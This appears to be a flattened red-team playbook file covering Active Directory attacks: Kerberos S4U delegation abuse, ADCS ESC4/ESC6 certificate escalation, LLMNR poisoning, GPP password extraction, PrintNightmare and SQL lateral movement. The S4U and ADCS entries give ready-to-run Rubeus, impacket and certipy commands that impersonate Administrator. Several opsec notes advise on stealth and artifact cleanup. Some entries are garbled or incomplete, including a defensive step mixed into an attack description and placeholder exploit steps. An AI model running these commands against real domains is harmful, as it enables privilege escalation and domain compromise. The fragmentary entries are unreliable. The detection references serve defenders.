s4u_delegation_abuse.description: Abuse S4U2Self and S4U2Proxy Kerberos extensions to obtain tickets impersonating any user to services with unconstrained/constrained delegation
s4u_delegation_abuse.prerequisites: Control over an account with delegation rights or TRUSTED_TO_AUTH_FOR_DELEGATION attribute set
s4u_delegation_abuse.opsec: S4U2Self/Proxy creates AS-REQ and TGS-REQ events (4768, 4769) which are normal but in unusual sequences. Monitor for atypical service ticket requests.
s4u_delegation_abuse.detection_ref: Monitor Event 4769 with unusual cross-service ticket requests; check for accounts with TrustedToAuthForDelegation flag

commands.description: S4U2Self to obtain impersonating ticket
commands.command:
# S4U2Self: obtain TGS impersonating admin to self
Rubeus.exe s4u /user:SVC_ACCOUNT /rc4:<ntlm_hash> /impersonateuser:Administrator /msdsspn:cifs/TARGET_HOST /ptt

# S4U2Proxy: pivot to target service
Rubeus.exe s4u /ticket:<base64_tgt> /impersonateuser:Administrator /msdsspn:cifs/TARGET_HOST /altservice:host,rpcss /ptt

commands.description: impacket S4U attack
commands.command:
python3 getST.py -spn 'cifs/TARGET_HOST' -impersonate Administrator DOMAIN/SVC_ACCOUNT:password
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass DOMAIN/Administrator@TARGET_HOST

adcs_esc4_esc6.description: ADCS ESC4: Template ACL abuse to add enroll rights or modify templates; ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 CA flag enables any template to specify SANs for privilege escalation
adcs_esc4_esc6.prerequisites: ESC4: write ACL on certificate template; ESC6: CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set
adcs_esc4_esc6.opsec: Template modification (ESC4) is logged by CA. ESC6 exploitation via SAN is stealthy but PKI logs show unusual certificate requests.
adcs_esc4_esc6.detection_ref: Monitor certificate template ACL changes; alert on certificates issued with SANs for privileged accounts; audit EDITF_ATTRIBUTESUBJECTALTNAME2 flag

commands.description: ESC4: modify template to add ESC1 vulnerability
commands.command:
# ESC4: backup template, add ESC1 conditions, exploit, restore
certipy template -u attacker@DOMAIN -p 'Pass123' -dc-ip DC_IP -template VulnTemplate -save-old
certipy template -u attacker@DOMAIN -p 'Pass123' -dc-ip DC_IP -template VulnTemplate -enroll Everyone
certipy req -u attacker@DOMAIN -p 'Pass123' -dc-ip DC_IP -ca CORP-CA -template VulnTemplate -upn administrator@DOMAIN
certipy template -u attacker@DOMAIN -p 'Pass123' -dc-ip DC_IP -template VulnTemplate -configuration VulnTemplate.json

commands.description: ESC6: request cert with privileged SAN
commands.command:
certipy req -u attacker@DOMAIN -p 'Pass123' -dc-ip DC_IP -ca CORP-CA -template User -upn administrator@DOMAIN
certipy auth -pfx administrator.pfx -dc-ip DC_IP

llmnr_nbtns_poisoning.description: Capturing NTLMv2 hashes via LLMNR/NBT-NS/MDNS poisoning using Responder and Inveigh.

Start C# Inveigh executable.
Disable NBT-NS on Windows via PowerShell registry edit.

llmnr_nbtns_poisoning.prerequisites: Network access to broadcast domain; attacker IP reachable by victims; Responder or Inveigh installed
llmnr_nbtns_poisoning.opsec: Responder in -A (Analyze) mode is passive and safe for recon. Active poisoning (-wrf) captures hashes but triggers DNS/LLMNR anomalies in SIEM.
llmnr_nbtns_poisoning.detection_ref: LLMNR/NBT-NS disable via GPO; network anomaly detection for broadcast spoofing; Event 4624 from unexpected sources

gpo_passwords.description: Extracting credentials stored in Group Policy Preferences (GPP) — cpassword attributes in SYSVOL.

gpo_passwords.prerequisites: Domain user access; SYSVOL readable (default for all domain users); GPP cpassword present
gpo_passwords.opsec: GPP cpassword decryption is entirely offline after file access. SYSVOL is readable by all domain users — no special privileges needed.
gpo_passwords.detection_ref: GPP password removal via MS14-025 patch; SYSVOL access monitoring; automated GPP scanning by defenders

printnightmare_exploit.description: PrintNightmare (CVE-2021-1675 / CVE-2021-34527) — exploit Windows Print Spooler service for SYSTEM code execution.

Execute PrintNightmare exploit.

printnightmare_exploit.prerequisites: Valid domain credentials; Print Spooler service running on target; unpatched (KB5005010 or earlier missing)
printnightmare_exploit.opsec: PrintNightmare is very noisy — creates print driver registry entries. Use only when stealth is not critical. Clean up DLL and registry artifacts.
printnightmare_exploit.detection_ref: KB5005010 patch; Print Spooler service disablement; Sysmon Event 11 for DLL drops; Event 316 in Microsoft-Windows-PrintService log

privileged_access_sql.prerequisites: Valid domain credentials; MSSQL or WinRM service accessible; appropriate role membership
privileged_access_sql.opsec: SQL xp_cmdshell executes as SQL service account. Use SQL linked server chains for deeper lateral movement. WinRM (port 5985/5986) is often allowed.
privileged_access_sql.detection_ref: SQL Server audit log for xp_cmdshell; Event 4624 WinRM Type 3 logons; PowerUpSQL usage signatures; SQL server login anomalies
